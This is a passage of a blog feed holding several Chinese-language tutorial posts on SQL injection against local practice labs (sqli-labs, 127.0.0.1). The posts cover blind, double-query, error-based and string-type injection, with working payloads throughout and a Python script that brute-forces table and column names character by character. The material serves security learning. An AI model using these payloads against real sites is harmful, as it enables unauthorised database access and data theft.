class=\"line\">database()=challenge</span><br><span class=\"line\"></span><br><span class=\"line\">#4.爆破表名</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=20) %23</span><br><span class=\"line\">1-101</span><br><span class=\"line\">2-109</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-105</span><br><span class=\"line\">5-108</span><br><span class=\"line\">6-115</span><br><span class=\"line\">第一个表名emails</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;)) %23</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=20) %23</span><br><span class=\"line\">1-102</span><br><span class=\"line\">2-108</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-103</span><br><span class=\"line\">第二个表名flag</span><br><span class=\"line\"></span><br><span class=\"line\">#5.爆破表中的列</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&#x27;flag&#x27; limit 1,1),1,1))=20) %23</span><br><span class=\"line\">爆破脚本</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&#x27;flag&#x27; limit 0,1),%d,1))=ord(&#x27;%s&#x27;)) %23</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#6.爆破值</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challeng.flag where flag=&#x27;flag3&#x27; limit 1,1),1,1))=20) %23</span><br><span class=\"line\">1-103</span><br><span class=\"line\">2-105</span><br><span class=\"line\">3-114</span><br><span class=\"line\">gir</span><br></pre></td></tr></table></figure>\n<h5 id=\"【附】爆破脚本\"><a href=\"#【附】爆破脚本\" class=\"headerlink\" title=\"【附】爆破脚本\"></a>【附】爆破脚本</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>():</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:</span><br><span class=\"line\">\t\t\turl = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(url+<span class=\"string\">&#x27;%23&#x27;</span>)</span><br><span class=\"line\">\t\t\tr = requests.get(url+<span class=\"string\">&#x27;%23&#x27;</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;Username: kevin&#x27;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tname = name+i</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;FINAL target_name:&#x27;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\">target_name()</span><br></pre></td></tr></table></figure>\n<h5 id=\"脚本爆破数据库名\"><a href=\"#脚本爆破数据库名\" class=\"headerlink\" title=\"脚本爆破数据库名\"></a>脚本爆破数据库名</h5><p>url为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001120214845.png\" alt=\"image-20221001120214845\"></p>\n<h5 id=\"脚本爆破表名\"><a href=\"#脚本爆破表名\" class=\"headerlink\" title=\"脚本爆破表名\"></a>脚本爆破表名</h5><p>修改url为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = &quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot; %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出第一个表名<code>emails</code></p>\n<p><img src=\"image-20221001115314470.png\" alt=\"image-20221001115314470\"></p>\n<p>修改<code>limit 1,1</code>爆出第二个表名<code>flag</code></p>\n<p><img src=\"image-20221001115353280.png\" alt=\"image-20221001115353280\"></p>\n<h5 id=\"脚本爆破列名\"><a href=\"#脚本爆破列名\" class=\"headerlink\" title=\"脚本爆破列名\"></a>脚本爆破列名</h5><p>修改url为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出第一个列名<code>flag</code></p>\n<p><img src=\"image-20221001114442930.png\" alt=\"image-20221001114442930\"></p>\n<p>修改<code>limit 1,1</code>爆出第二个列名<code>value</code></p>\n<p><img src=\"image-20221001114318316.png\" alt=\"image-20221001114318316\"></p>\n<h5 id=\"脚本爆破值\"><a href=\"#脚本爆破值\" class=\"headerlink\" title=\"脚本爆破值\"></a>脚本爆破值</h5><p>修改url为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challenge.flag where flag=&#x27;flag3&#x27;),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出当<code>flag=flag3</code>时的<code>value</code>值为<code>gir</code></p>\n<p><img src=\"image-20221001115921853.png\" alt=\"image-20221001115921853\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "title": "双注入",
            "date_published": "2022-09-30T16:08:18.000Z",
            "content_html": "<h1 id=\"SQL-注入之双注入\"><a href=\"#SQL-注入之双注入\" class=\"headerlink\" title=\"SQL 注入之双注入\"></a>SQL 注入之双注入</h1><p>本篇使用双注入。</p>\n<h2 id=\"注入步骤\"><a href=\"#注入步骤\" class=\"headerlink\" title=\"注入步骤\"></a>注入步骤</h2><h3 id=\"设置代理\"><a href=\"#设置代理\" class=\"headerlink\" title=\"设置代理\"></a>设置代理</h3><p>还是Less-11，我们挂上<strong>BurpSuit</strong>代理，然后<strong>Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220930220638714.png\" alt=\"image-20220930220638714\"></p>\n<h3 id=\"确定注入类型和列数\"><a href=\"#确定注入类型和列数\" class=\"headerlink\" title=\"确定注入类型和列数\"></a>确定注入类型和列数</h3><p>我们输入1 + 单引号。 <strong>不报错</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221056886.png\" alt=\"image-20220930221056886\"></p>\n<p>输入1 + 单引号 + %23</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27;&quot; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>报错，<code>&quot; #&#39; and password=&#39;123456&#39; LIMIT 0,1</code>。</p>\n<p>由#号后面跟着个单引号，这就说明第一个<strong>username是使用单引号闭合的</strong>。</p>\n<p><img src=\"image-20220930221013645.png\" alt=\"image-20220930221013645\"></p>\n<p>使用order by n确定列数</p>\n<p>输入2，不报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 2 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221434509.png\" alt=\"image-20220930221434509\"></p>\n<p>输入3，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 3 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221557671.png\" alt=\"image-20220930221557671\"></p>\n<p>综上，注入类型是<strong>POST型单引号注入</strong>，且<strong>查询列数为2</strong>。</p>\n<p>采用双注入时，我们需要使用到以下函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；</span><br><span class=\"line\"></span><br><span class=\"line\">floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。</span><br><span class=\"line\">Select floor(11.2); ----&gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|   floor(11.2)  |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|           11   |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\"></span><br><span class=\"line\">rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值</span><br><span class=\"line\">举例说明：select rand() from qs_ad_category;</span><br><span class=\"line\">结果为随机的浮点型小数：0.7450851357961866</span><br><span class=\"line\"></span><br><span class=\"line\">floor() 函数 配合 rand() 函数</span><br><span class=\"line\">由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866</span><br><span class=\"line\">而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。</span><br><span class=\"line\">例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：</span><br><span class=\"line\">select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。</span><br><span class=\"line\">若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。</span><br><span class=\"line\">count(1)：统计不为NULL 的记录。</span><br><span class=\"line\">count(*)：统计所有的记录（包括NULL）</span><br><span class=\"line\">count(字段)：统计该&quot;字段&quot;不为NULL 的记录。</span><br><span class=\"line\">count(DISTINCT 字段)：统计该&quot;字段&quot;去重且不为NULL 的记录。</span><br><span class=\"line\"></span><br><span class=\"line\">如果三者一起使用:</span><br><span class=\"line\">select 1,count(1) from information_schema.tables group by floor(rand(0)*2)</span><br><span class=\"line\">意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）</span><br></pre></td></tr></table></figure>\n<p>使用group by floor(rand() *2)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930223216903.png\" alt=\"image-20220930223216903\"></p>\n<p>可以看到，uname 和 password位都被select的内容（1和2）代替。</p>\n<p>下面探究group by、rand()、count()的组合使用的关系。</p>\n<h3 id=\"灵魂拷问一：rand-和rand-0-有什么区别\"><a href=\"#灵魂拷问一：rand-和rand-0-有什么区别\" class=\"headerlink\" title=\"灵魂拷问一：rand()和rand(0)有什么区别?\"></a>灵魂拷问一：rand()和rand(0)有什么区别?</h3><p>使用<code>rand() *2</code>，<code>第一次</code>。</p>\n<p><img src=\"image-20220930225234750.png\" alt=\"image-20220930225234750\"></p>\n<p>使用<code>rand() *2</code>，<code>第二次</code>。</p>\n<p><img src=\"image-20220930225215910.png\" alt=\"image-20220930225215910\"></p>\n<p>使用<code>rand() *2</code>，<code>第三次</code>。</p>\n<p><img src=\"image-20220930225250214.png\" alt=\"image-20220930225250214\"></p>\n<p>综合以上三次使用rand()*2的情况，我们发现结果毫无规律，是真正的随机。</p>\n<p>使用<code>rand(0) *2</code>，<code>第一次</code>、<code>第二次</code>、<code>第三次</code>都是下图：</p>\n<p><img src=\"image-20220930225429894.png\" alt=\"image-20220930225429894\"></p>\n<p>结果说明，使用rand(0)*2可以做到一种伪随机变化，会一直保持011 011 011这样的规律。</p>\n<h3 id=\"灵魂拷问二：为什么select-1-count-1-from-xxx-group-by-floor-rand-0-2-会报错？\"><a href=\"#灵魂拷问二：为什么select-1-count-1-from-xxx-group-by-floor-rand-0-2-会报错？\" class=\"headerlink\" title=\"灵魂拷问二：为什么select 1, count(1) from xxx group by floor(rand(0) * 2) 会报错？\"></a>灵魂拷问二：为什么select 1, count(1) from xxx group by floor(rand(0) * 2) 会报错？</h3><p>我们需要知道先创建虚拟表，以下图(其中key是group by后面跟随的内容【即主键】，不可重复)</p>\n<p><img src=\"image-20220930230206868.png\" alt=\"image-20220930230206868\"></p>\n<p>开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则count(1)字段直接加1，</p>\n<p><img src=\"image-20220930230334615.png\" alt=\"image-20220930230334615\"></p>\n<p>由此看到 若是key存在的话就+1， 不存在的话就新建一个key。</p>\n<p>但是mysql官方有给提示，查询的时候若是使用了rand()的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用group by 的时候，floor(rand(0)*2)会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。</p>\n<p>由前文可知，floor(rand(0)*2) 的值是011011011…….的规律。</p>\n<p>取第一条记录，取到的值是0【<code>第一次计算</code>】。</p>\n<p><code>判断</code>：虚表中发现0这个键值并不存在，那么，floor(rand(0)*2)会被再次计算一次</p>\n<p>结果取到了1【<code>第二次计算</code>】。将key=1插入虚表，这是第一条记录查询完毕。</p>\n<p><img src=\"image-20220930231052670.png\" alt=\"image-20220930231052670\"></p>\n<p>查询第二次记录，再次计算floor(rand(0)*2)，发现结果为1【<code>第三次计算</code>】。</p>\n<p>查询虚表，发现1这个键值已经存在，因此floor(rand(0)*2) 不会再次计算，直接count(1)加1，第二条记录查询完毕。</p>\n<p><img src=\"image-20220930231458853.png\" alt=\"image-20220930231458853\"></p>\n<p>查询第三条记录，再次计算floor(rand(0)*2)，取值为0【<code>第四次计算</code>】，查询虚表，发现键值没有0，则再次计算floor，取值为1【<code>第五次计算</code>】</p>\n<p>而此时，1这个主键已经存在于虚表中，新计算的值也为1【<code>第五次计算</code>】，<strong>由于插入的key主键值必须唯一</strong>，新计算的1和主键1重复，因此插入的时候直接报错。</p>\n<h3 id=\"灵魂拷问三：选择rand-0-而非rand-的原因\"><a href=\"#灵魂拷问三：选择rand-0-而非rand-的原因\" class=\"headerlink\" title=\"灵魂拷问三：选择rand(0)而非rand()的原因\"></a>灵魂拷问三：选择rand(0)而非rand()的原因</h3><p>简而言之，group by插入进<key，count(1)>虚表的前提是——<code>当前的记录在虚表中不存在</code>。</p>\n<p>白话文解释：当前的记录由于011011011这特殊规律导致0这个记录的在表中不存在，计算时总是被取值成1插入虚表，第一次还能插进来，但在第二次新插入进来的1又存在于虚表中，所以就报“重复条目“的错了。</p>\n<p>选择<code>rand(0)x2</code>是<strong>必会报错</strong>，而<code>rand()x2</code>就不一定了【可能报错、可能不报错】。</p>\n<p>因为通过上文解释，如果不是011011这个特殊规律，0和1是都可以进到虚表中，如果都能进来，那就不会报错。</p>\n<p>因此，100%报错须要count()，rand(0)*2、group by，三者缺一不可。</p>\n<h3 id=\"双注入走起\"><a href=\"#双注入走起\" class=\"headerlink\" title=\"双注入走起\"></a>双注入走起</h3><p>首先使用concat组合字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000024436.png\" alt=\"image-20221001000024436\"></p>\n<p>将version处替换成我们想要的select语句【注意，这里只能使用limit 0,1来进行输出爆破，group_concat会爆出数据库信息失败】</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000515293.png\" alt=\"image-20221001000515293\"></p>\n<p>至此，双注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "title": "报错注入",
            "date_published": "2022-09-29T15:57:38.000Z",
            "content_html": "<h1 id=\"SQL-注入之报错注入\"><a href=\"#SQL-注入之报错注入\" class=\"headerlink\" title=\"SQL 注入之报错注入\"></a>SQL 注入之报错注入</h1><p>本篇使用报错注入。</p>\n<p><code>注意</code>：报错函数的使用中，第二个参数如果来自于查询语句，都是<strong>需要用小括号包裹起来的</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#使用 extractvalue(1, (select xxx))</span><br><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br><span class=\"line\"></span><br><span class=\"line\">#使用 updatexml(1, (select xxx), 1)</span><br><span class=\"line\">uname=1&#x27; union select 1, updatexml(1, concat(&#x27;%&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<h2 id=\"注入步骤\"><a href=\"#注入步骤\" class=\"headerlink\" title=\"注入步骤\"></a>注入步骤</h2><h3 id=\"设置代理\"><a href=\"#设置代理\" class=\"headerlink\" title=\"设置代理\"></a>设置代理</h3><p>还是Less-11，我们挂上<strong>BurpSuit</strong>代理，然后<strong>Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220929231322659.png\" alt=\"image-20220929231322659\"></p>\n<p>报错注入常使用的函数如下：</p>\n<p>①<strong>extractvalue</strong>():从目标XML中返回包含所查询值的字符串。</p>\n<p>例子：extractvalue(XML_document, XPath_string);</p>\n<p><code>第一个参数</code>：XML_documentshi String格式，为XML文档对象的名称。<strong>在报错注入中可以随意指定，比如1即可。</strong></p>\n<p><code>第二个参数</code>：XPath_string (Xpath格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p>concat()：返回结果为连接参数产生的字符串。</p>\n<p>②<strong>updatexml</strong>(): 更新XML信息</p>\n<p>例子：updatexml(XML_document, XPath_string, new_value); </p>\n<p><code>第一个参数</code>：XML_document是String格式，为XML文档对象的名称。<strong>在报错注入中可以随意指定，比如1即可。</strong></p>\n<p><code>第二个参数</code>：XPath_string (XPATH格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p><code>第三个参数</code>：new_value, String格式， 替换查找到的符合条件的数据。<strong>在报错注入中可以随意指定，比如1即可。</strong></p>\n<h3 id=\"确定注入类型和列数\"><a href=\"#确定注入类型和列数\" class=\"headerlink\" title=\"确定注入类型和列数\"></a>确定注入类型和列数</h3><p>通过单引号注入和order by n来<strong>确定注入类型</strong>和<strong>查询列数</strong>。</p>\n<p><img src=\"image-20220929232026560.png\" alt=\"image-20220929232026560\"></p>\n<h3 id=\"使用指定报错函数\"><a href=\"#使用指定报错函数\" class=\"headerlink\" title=\"使用指定报错函数\"></a>使用指定报错函数</h3><p>那么我们就可构造：</p>\n<p>extractvalue(1, XPATH_string)，其中XPATH_string为(select version())</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, (select version())) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233031785.png\" alt=\"image-20220929233031785\"></p>\n<p>可以看到版本号被截断，信息不全。我们尝试调concat()函数使用0x7e字符拼接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233343167.png\" alt=\"image-20220929233343167\"></p>\n<p>这里分割字符串可以换成%，分割字符串的选择比较看运气，有时候后台会校验，所以多用ASCII来表示。<strong>比如波浪线的ASCII为0x7e</strong></p>\n<p><img src=\"image-20220929233647634.png\" alt=\"image-20220929233647634\"></p>\n<h3 id=\"泄露数据库信息\"><a href=\"#泄露数据库信息\" class=\"headerlink\" title=\"泄露数据库信息\"></a>泄露数据库信息</h3><p>准备泄露数据库的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>但是报了错，<code>Subquery returns more than 1 row</code>，说明最后查询的select的列数超过了一列。</p>\n<p><img src=\"image-20220929233914430.png\" alt=\"image-20220929233914430\"></p>\n<p>我们需要<strong>使用limit 0,1限制一列输出</strong></p>\n<p><img src=\"image-20220929234118900.png\" alt=\"image-20220929234118900\"></p>\n<p>或者<strong>使用group_concat拼接成一列</strong></p>\n<p><img src=\"image-20220929234238245.png\" alt=\"image-20220929234238245\"></p>\n<p>同理，也使用updatexml进行报错注入</p>\n<p>构造时，因为我们关键是为了调用<code>updatexml</code>函数和使用<code>第二个参数</code>进行内容输出，因此<strong>第一个参数</strong>和<strong>第三个参数</strong>都是<strong>“无用”</strong>的，设置成1即可。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; union select 1, updatexml(1, concat(&#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929234443551.png\" alt=\"image-20220929234443551\"></p>\n<p>至此，报错注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "字符型注入",
            "date_published": "2022-09-29T13:54:18.000Z",
            "content_html": "<h1 id=\"SQL-注入之字符型注入\"><a href=\"#SQL-注入之字符型注入\" class=\"headerlink\" title=\"SQL 注入之字符型注入\"></a>SQL 注入之字符型注入</h1><p>本篇使用字符型注入。</p>\n<h2 id=\"注入步骤-单引号注入\"><a href=\"#注入步骤-单引号注入\" class=\"headerlink\" title=\"注入步骤(单引号注入)\"></a>注入步骤(单引号注入)</h2><p>由于Less-1从请求上看到是GET型，所以礼节性地输入个id=1</p>\n<p><img src=\"image-20220929215708949.png\" alt=\"image-20220929215708949\"></p>\n<h3 id=\"尝试注入类型\"><a href=\"#尝试注入类型\" class=\"headerlink\" title=\"尝试注入类型\"></a>尝试注入类型</h3><p>输入1’  来看看是否报错</p>\n<p><img src=\"image-20220929215814839.png\" alt=\"image-20220929215814839\"></p>\n<p>输入22’  来看看是否报错</p>\n<p><img src=\"image-20220929215843779.png\" alt=\"image-20220929215843779\"></p>\n<p>那么，<code>&#39;22&#39;&#39; LIMIT 0,1</code>中，’22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型\"><a href=\"#确定注入类型\" class=\"headerlink\" title=\"确定注入类型\"></a>确定注入类型</h3><p>闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、—+</p>\n<p>那么，我们尝试一下#号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; #</span></span><br></pre></td></tr></table></figure>\n<p>不行，会报错，可能后台过滤了#号。</p>\n<p><img src=\"image-20220929220358319.png\" alt=\"image-20220929220358319\"></p>\n<p>尝试%23也一样，就不再贴图了。</p>\n<p>我们最后尝试—+，成功。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220326957.png\" alt=\"image-20220929220326957\"></p>\n<p>由此，可以确定此题注入类型为字符型注入的<strong>单引号注入</strong>。</p>\n<h3 id=\"确定列数\"><a href=\"#确定列数\" class=\"headerlink\" title=\"确定列数\"></a>确定列数</h3><p>使用order by n 来确定有多少列。<strong>order by n</strong>会以当前表中的“<strong>第n列</strong>”进行排序，如果<strong>第n列不存在</strong>，则会抛出<code>Unknown column &#39;n&#39;</code>的异常。</p>\n<p>4列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220842238.png\" alt=\"image-20220929220842238\"></p>\n<p>3列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220533059.png\" alt=\"image-20220929220533059\"></p>\n<p>不报错，则说明<code>有3列</code>。</p>\n<h3 id=\"构造联合查询泄露数据库信息\"><a href=\"#构造联合查询泄露数据库信息\" class=\"headerlink\" title=\"构造联合查询泄露数据库信息\"></a>构造联合查询泄露数据库信息</h3><p>这回我们使用<code>and 0</code>来构造对于id的查询为假的条件</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(table_name), database() from information_schema.tables where table_schema = database() --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929221156300.png\" alt=\"image-20220929221156300\"></p>\n<h2 id=\"注入步骤-双引号注入\"><a href=\"#注入步骤-双引号注入\" class=\"headerlink\" 